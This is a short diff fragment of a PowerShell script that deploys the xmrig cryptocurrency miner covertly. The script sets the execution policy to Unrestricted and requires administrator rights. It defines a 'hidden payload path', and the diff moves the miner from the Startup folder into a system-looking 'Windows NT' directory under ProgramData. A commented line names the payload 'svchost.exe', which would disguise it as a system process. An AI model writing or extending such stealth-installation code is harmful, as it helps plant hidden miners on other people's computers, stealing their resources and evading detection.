@@ -118,7 +118,7 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 #Requires -RunAsAdministrator
 #$env:SystemRoo
 # Define hidden payload path
-$hiddenDir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+$hiddenDir = "C:\ProgramData\Microsoft\Windows NT"
 #$payloadName = "svchost.exe"
 $destinationPath = "$hiddenDir\xmrig-6.22.2\xmrig.exe"  #Join-Path $hiddenDir $payloadName
 #$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
